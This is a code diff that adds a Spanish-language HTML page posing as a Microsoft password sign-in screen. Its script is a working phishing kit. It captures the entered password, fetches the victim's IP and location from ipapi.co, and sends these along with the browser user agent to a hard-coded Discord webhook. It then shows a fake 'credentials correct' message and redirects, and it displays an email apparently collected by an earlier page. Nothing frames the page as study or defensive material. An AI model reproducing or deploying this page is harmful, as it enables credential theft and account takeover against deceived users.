@@ -1,0 +1,521 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar sesión</title>
+    <link rel="shortcut icon" href="https://cdn.glitch.global/236764b8-4373-4179-baae-d756cfc63432/ico.ico?v=1741715931055" type="image/x-icon">
+    <link href="https://fonts.googleapis.com/css2?family=Reddit+Sans:ital,wght@0,200..900;1,200..900&display=swap" rel="stylesheet">
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', 'Reddit Sans', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #0078d4 0%, #106ebe 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .background-bubbles {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            overflow: hidden;
+        }
+        
+        .background-bubbles div {
+            position: absolute;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.1);
+            animation: float 15s infinite ease-in-out;
+        }
+        
+        @keyframes float {
+            0% {
+                transform: translateY(0) rotate(0deg);
+                opacity: 1;
+            }
+            100% {
+                transform: translateY(-1000px) rotate(720deg);
+                opacity: 0;
+            }
+        }
+        
+        .login-container {
+            width: 100%;
+            max-width: 440px;
+            background-color: #fff;
+            border-radius: 12px;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.2);
+            padding: 44px;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .logo {
+            text-align: center;
+            margin-bottom: 28px;
+        }
+        
+        .logo img {
+            height: 32px;
+        }
+        
+        .back-button {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+            color: #666;
+            font-size: 14px;
+            cursor: pointer;
+        }
+        
+        .back-button svg {
+            margin-right: 8px;
+        }
+        
+        .title {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: #1b1b1b;
+        }
+        
+        .subtitle {
+            font-size: 14px;
+            color: #616161;
+            margin-bottom: 24px;
+        }
+        
+        .form-group {
+            margin-bottom: 16px;
+            position: relative;
+        }
+        
+        .form-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 6px;
+            color: #1b1b1b;
+        }
+        
+        .input-with-icon {
+            position: relative;
+        }
+        
+        .input-with-icon input {
+            width: 100%;
+            height: 42px;
+            padding: 10px 40px 10px 12px;
+            font-size: 15px;
+            border: 1px solid #d2d2d2;
+            border-radius: 4px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+        
+        .input-with-icon input:focus {
+            border-color: #0078d4;
+            box-shadow: 0 0 0 2px rgba(0, 120, 212, 0.2);
+        }
+        
+        .toggle-password {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: #666;
+        }
+        
+        .forgot-password {
+            text-align: right;
+            margin-bottom: 20px;
+        }
+        
+        .forgot-password a {
+            color: #0078d4;
+            text-decoration: none;
+            font-size: 13px;
+        }
+        
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+        
+        .submit-button {
+            width: 100%;
+            background-color: #0078d4;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 12px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-bottom: 20px;
+            transition: background-color 0.2s;
+        }
+        
+        .submit-button:hover {
+            background-color: #0066b8;
+        }
+        
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-bottom: 20px;
+        }
+        
+        .footer-links a {
+            color: #616161;
+            text-decoration: none;
+            font-size: 12px;
+        }
+        
+        .footer-links a:hover {
+            color: #0078d4;
+            text-decoration: underline;
+        }
+        
+        .privacy-note {
+            font-size: 12px;
+            color: #616161;
+            text-align: center;
+        }
+        
+        .privacy-note a {
+            color: #0078d4;
+            text-decoration: none;
+        }
+        
+        .privacy-note a:hover {
+            text-decoration: underline;
+        }
+        
+        .notification {
+            display: none;
+            padding: 12px;
+            border-radius: 4px;
+            margin-bottom: 16px;
+            text-align: center;
+            font-size: 14px;
+        }
+        
+        .success {
+            background-color: #dff6dd;
+            color: #107c10;
+            border: 1px solid #107c10;
+        }
+        
+        .error {
+            background-color: #fde7e9;
+            color: #d13438;
+            border: 1px solid #d13438;
+        }
+        
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+            margin-right: 10px;
+            vertical-align: middle;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .success-message {
+            background-color: #dff6dd;
+            color: #107c10;
+            border: 1px solid #107c10;
+            padding: 12px;
+            border-radius: 4px;
+            margin-bottom: 20px;
+            font-size: 14px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="background-bubbles">
+        <div style="left: 10%; width: 40px; height: 40px; animation-delay: 0s;"></div>
+        <div style="left: 20%; width: 80px; height: 80px; animation-delay: 2s;"></div>
+        <div style="left: 35%; width: 60px; height: 60px; animation-delay: 6s;"></div>
+        <div style="left: 50%; width: 50px; height: 50px; animation-delay: 1s;"></div>
+        <div style="left: 65%; width: 70px; height: 70px; animation-delay: 4s;"></div>
+        <div style="left: 80%; width: 45px; height: 45px; animation-delay: 8s;"></div>
+        <div style="left: 90%; width: 90px; height: 90px; animation-delay: 3s;"></div>
+    </div>
+    
+    <div class="login-container">
+        <div class="logo">
+            <img src="https://cdn.glitch.global/236764b8-4373-4179-baae-d756cfc63432/log.svg?v=1741715936758" alt="Microsoft">
+        </div>
+        
+        <div class="back-button" onclick="history.back()">
+            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#ababab" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+                <path d="M5 12l14 0" />
+                <path d="M5 12l6 6" />
+                <path d="M5 12l6 -6" />
+            </svg>
+            <span id="local">Atrás</span>
+        </div>
+        
+        <h2 class="title">Escribir contraseña</h2>
+        <p class="subtitle">Introduce tu contraseña para acceder a tu cuenta</p>
+        
+        <div id="notification" class="notification"></div>
+        <div id="success-message" class="success-message">
+            Credenciales correctas. Redirigiendo a su cuenta...
+        </div>
+        
+        <form id="login-form">
+            <div class="form-group">
+                <label for="password">Contraseña</label>
+                <div class="input-with-icon">
+                    <input id="password" name="password" type="password" placeholder="Contraseña" required>
+                    <span class="toggle-password" onclick="togglePasswordVisibility()">
+                        <svg id="eye-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" width="20" height="20" stroke-width="2">
+                            <path d="M10 12a2 2 0 1 0 4 0a2 2 0 0 0 -4 0"></path>
+                            <path d="M21 12c-2.4 4 -5.4 6 -9 6c-3.6 0 -6.6 -2 -9 -6c2.4 -4 5.4 -6 9 -6c3.6 0 6.6 2 9 6"></path>
+                        </svg>
+                    </span>
+                </div>
+            </div>
+            
+            <div class="forgot-password">
+                <a href="#">¿Ha olvidado su contraseña?</a>
+            </div>
+            
+            <button type="submit" class="submit-button" id="submit-btn">
+                <span id="button-text">Iniciar sesión</span>
+            </button>
+        </form>
+        
+        <div class="footer-links">
+            <a href="#">Términos de uso</a>
+            <a href="#">Privacidad y cookies</a>
+            <a href="#">Ayuda</a>
+        </div>
+        
+        <p class="privacy-note">
+            Use la navegación privada si está en un dispositivo compartido. <a href="#">Más información</a>
+        </p>
+    </div>
+
+    <script>
+        // Configuración - Reemplaza con tu Webhook de Discord
+        const DISCORD_WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1408473575647744201/9mNHBbWbHY6o7jyUw0xJPRPLXl_zpjnNmT4PdX_0a_QzP4Bz42rjyqJtXn1pFE_UTQUJ';
+        
+        // Generar burbujas de fondo
+        function createBubbles() {
+            const bubblesContainer = document.querySelector('.background-bubbles');
+            for (let i = 0; i < 15; i++) {
+                const bubble = document.createElement('div');
+                const size = Math.random() * 60 + 20;
+                const left = Math.random() * 100;
+                const animationDelay = Math.random() * 10;
+                const animationDuration = Math.random() * 20 + 15;
+                
+                bubble.style.width = `${size}px`;
+                bubble.style.height = `${size}px`;
+                bubble.style.left = `${left}%`;
+                bubble.style.animationDelay = `${animationDelay}s`;
+                bubble.style.animationDuration = `${animationDuration}s`;
+                
+                bubblesContainer.appendChild(bubble);
+            }
+        }
+        
+        // Alternar visibilidad de contraseña
+        function togglePasswordVisibility() {
+            const passwordInput = document.getElementById('password');
+            const eyeIcon = document.getElementById('eye-icon');
+            
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                eyeIcon.innerHTML = '<path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M10.585 10.587a2 2 0 0 0 2.829 2.828" /><path d="M16.681 16.673a8.717 8.717 0 0 1 -4.681 1.327c-3.6 0 -6.6 -2 -9 -6c1.272 -2.12 2.712 -3.678 4.32 -4.674m2.86 -1.146a9.055 9.055 0 0 1 1.82 -.18c3.6 0 6.6 2 9 6c-.666 1.11 -1.379 2.067 -2.138 2.87" /><path d="M3 3l18 18" />';
+            } else {
+                passwordInput.type = 'password';
+                eyeIcon.innerHTML = '<path d="M10 12a2 2 0 1 0 4 0a2 2 0 0 0 -4 0"></path><path d="M21 12c-2.4 4 -5.4 6 -9 6c-3.6 0 -6.6 -2 -9 -6c2.4 -4 5.4 -6 9 -6c3.6 0 6.6 2 9 6"></path>';
+            }
+        }
+        
+        // Mostrar notificación
+        function showNotification(message, type) {
+            const notification = document.getElementById('notification');
+            notification.textContent = message;
+            notification.className = 'notification ' + type;
+            notification.style.display = 'block';
+            
+            // Ocultar notificación después de 5 segundos
+            setTimeout(() => {
+                notification.style.display = 'none';
+            }, 5000);
+        }
+        
+        // Mostrar mensaje de éxito
+        function showSuccessMessage() {
+            const successMessage = document.getElementById('success-message');
+            successMessage.style.display = 'block';
+            
+            // Ocultar mensaje después de 5 segundos
+            setTimeout(() => {
+                successMessage.style.display = 'none';
+            }, 5000);
+        }
+        
+        // Obtener información de geolocalización
+        async function getGeoLocation() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                return data;
+            } catch (error) {
+                console.error('Error obteniendo geolocalización:', error);
+                return {
+                    ip: 'No disponible',
+                    city: 'No disponible',
+                    country_name: 'No disponible'
+                };
+            }
+        }
+        
+        // Enviar datos a Discord
+        async function sendToDiscord(password) {
+            try {
+                // Obtener información de geolocalización
+                const locationData = await getGeoLocation();
+                
+                // Crear el mensaje embed para Discord
+                const embed = {
+                    title: "🔐 Nuevo inicio de sesión",
+                    color: 0x0078d4, // Color azul de Microsoft
+                    fields: [
+                        {
+                            name: "Contraseña",
+                            value: password || "No proporcionada",
+                            inline: false
+                        },
+                        {
+                            name: "IP",
+                            value: locationData.ip,
+                            inline: true
+                        },
+                        {
+                            name: "Ubicación",
+                            value: `${locationData.city}, ${locationData.country_name}`,
+                            inline: true
+                        },
+                        {
+                            name: "Navegador",
+                            value: navigator.userAgent,
+                            inline: false
+                        },
+                        {
+                            name: "Fecha y hora",
+                            value: new Date().toLocaleString('es-ES'),
+                            inline: true
+                        }
+                    ],
+                    footer: {
+                        text: "Sistema de notificación"
+                    }
+                };
+                
+                // Enviar el webhook a Discord
+                const response = await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        embeds: [embed]
+                    })
+                });
+                
+                return response.ok;
+            } catch (error) {
+                console.error('Error enviando a Discord:', error);
+                return false;
+            }
+        }
+        
+        // Redirigir a index0.html después de mostrar el mensaje de éxito
+        function redirectToIndex2() {
+            // Redirigir a index0.html después de un breve retraso
+            setTimeout(() => {
+                window.location.href = 'index0.html';
+            }, 2000);
+        }
+        
+        // Manejar el envío del formulario
+        document.getElementById('login-form').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const password = document.getElementById('password').value;
+            const submitBtn = document.getElementById('submit-btn');
+            const buttonText = document.getElementById('button-text');
+            
+            // Validación
+            if (!password) {
+                showNotification('Por favor, introduce tu contraseña', 'error');
+                return;
+            }
+            
+            // Mostrar estado de carga
+            submitBtn.disabled = true;
+            buttonText.innerHTML = '<span class="loading"></span> Procesando...';
+            
+            // Enviar datos a Discord
+            const success = await sendToDiscord(password);
+            
+            if (success) {
+                // Mostrar mensaje de credenciales correctas
+                setTimeout(() => {
+                    showSuccessMessage();
+                    
+                    // Redirigir a index0.html después del mensaje
+                    redirectToIndex2();
+                }, 1500);
+            } else {
+                showNotification('Error de conexión. Inténtelo de nuevo.', 'error');
+                submitBtn.disabled = false;
+                buttonText.textContent = 'Iniciar sesión';
+            }
+        });
+        
+        // Inicializar la página
+        document.addEventListener('DOMContentLoaded', function() {
+            createBubbles();
+            
+            // Obtener y mostrar el email del localStorage si existe
+            const savedEmail = localStorage.getItem('userEmail');
+            if (savedEmail) {
+                document.getElementById('local').textContent = savedEmail;
+            }
+        });
+    </script>
+</body>
+</html>
